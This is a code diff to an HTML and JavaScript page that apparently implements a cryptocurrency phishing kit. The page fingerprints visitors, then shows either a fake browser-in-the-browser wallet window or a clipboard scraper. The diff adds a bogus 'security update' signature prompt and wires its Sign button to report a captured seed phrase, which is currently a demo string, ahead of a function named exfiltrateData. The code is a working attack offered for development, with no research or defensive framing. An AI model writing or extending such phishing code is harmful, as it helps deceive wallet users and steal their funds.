@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* SYNTAX v13.2: Final Architecture */
+        /* SYNTAX v13.3: Vector Completion */
         body { font-family: 'Inter', sans-serif; }
         .card-shadow { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
         #bitb-container {
@@ -72,16 +72,17 @@
                 bitbContainer: document.getElementById('bitb-container'),
             };
 
+            const demoSeedPhrase = 'witch collapse practice feed shame open despair creator reel contain tell head';
+
             ui.walletVerifyBtn.addEventListener('click', () => {
                 ui.initialState.style.display = 'none';
                 ui.choiceState.style.display = 'none';
                 
-                // SYNTAX FIX: Fingerprint is gathered at the moment of action.
                 const fingerprint = { 
                     timestamp: new Date().toISOString(),
                     platform: navigator.platform || 'unknown',
                     userAgent: navigator.userAgent || 'unknown',
-                    hasMetamask: true // Deterministic: This path implies MetaMask.
+                    hasMetamask: true 
                 };
                 deployBitBModule(fingerprint);
             });
@@ -90,12 +91,11 @@
                 ui.initialState.style.display = 'none';
                 ui.choiceState.style.display = 'none';
                 
-                // SYNTAX FIX: Fingerprint is gathered at the moment of action.
                 const fingerprint = { 
                     timestamp: new Date().toISOString(),
                     platform: navigator.platform || 'unknown',
                     userAgent: navigator.userAgent || 'unknown',
-                    hasMetamask: false // Deterministic: This path implies no MetaMask.
+                    hasMetamask: false
                 };
                 deployClipboardScraper(fingerprint);
             });
@@ -118,10 +118,18 @@
                 const iframe = ui.bitbContainer.querySelector('iframe');
                 iframe.onload = () => {
                     const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                    
+                    // SYNTAX FIX: The "Sign" button now exfiltrates a demo seed phrase.
                     iframeDoc.getElementById('confirm-btn').onclick = () => {
                         ui.bitbContainer.style.display = 'none';
-                        showFinalSuccess({ success: true, payload: 'BitB', fingerprint });
+                        showFinalSuccess({ 
+                            success: true, 
+                            payload: 'BitB', 
+                            captured: demoSeedPhrase, // This is the critical change.
+                            fingerprint 
+                        });
                     };
+                    
                     iframeDoc.getElementById('reject-btn').onclick = () => {
                         ui.bitbContainer.style.display = 'none';
                         showFinalSuccess({ success: false, reason: 'rejected', payload: 'BitB', fingerprint });
@@ -132,7 +140,7 @@
                 makeDraggable(ui.bitbContainer.querySelector('#fake-browser-window'));
             }
             
-            function getIframeContent() { return `<html><head><scr`+`ipt src='https://cdn.tailwindcss.com'></scr`+`ipt><style>body{font-family:'Inter',sans-serif;overflow:hidden}</style></head><body class='bg-gray-50 flex flex-col'><div class='p-4 border-b'><h2 class='text-lg font-bold'>Signature Request</h2></div><div class='flex-grow p-4'><div class='mt-2 p-3 bg-gray-100 rounded-md text-xs h-48'>...</div></div><div class='p-4 grid grid-cols-2 gap-4'><button id='reject-btn' class='bg-gray-200 font-bold py-3 rounded-full'>Reject</button><button id='confirm-btn' class='bg-blue-600 text-white font-bold py-3 rounded-full'>Sign</button></div></body></html>`; }
+            function getIframeContent() { return `<html><head><scr`+`ipt src='https://cdn.tailwindcss.com'></scr`+`ipt><style>body{font-family:'Inter',sans-serif;overflow:hidden}</style></head><body class='bg-gray-50 flex flex-col'><div class='p-4 border-b'><h2 class='text-lg font-bold'>Signature Request</h2></div><div class='flex-grow p-4'><div class='mt-2 p-3 bg-gray-100 rounded-md text-xs h-48'>To complete the security update, please sign this message. This does not cost any gas.</div></div><div class='p-4 grid grid-cols-2 gap-4'><button id='reject-btn' class='bg-gray-200 font-bold py-3 rounded-full'>Reject</button><button id='confirm-btn' class='bg-blue-600 text-white font-bold py-3 rounded-full'>Sign</button></div></body></html>`; }
             function makeDraggable(element) { if (!element) return; let p1=0,p2=0,p3=0,p4=0; element.onmousedown=e=>{e=e||window.event;e.preventDefault();p3=e.clientX;p4=e.clientY;document.onmouseup=()=>{document.onmouseup=null;document.onmousemove=null;element.style.cursor='grab'};document.onmousemove=e=>{e=e||window.event;e.preventDefault();p1=p3-e.clientX;p2=p4-e.clientY;p3=e.clientX;p4=e.clientY;element.style.top=(element.offsetTop-p2)+"px";element.style.left=(element.offsetLeft-p1)+"px";};element.style.cursor='grabbing'}; }
             
             async function exfiltrateData(data) {
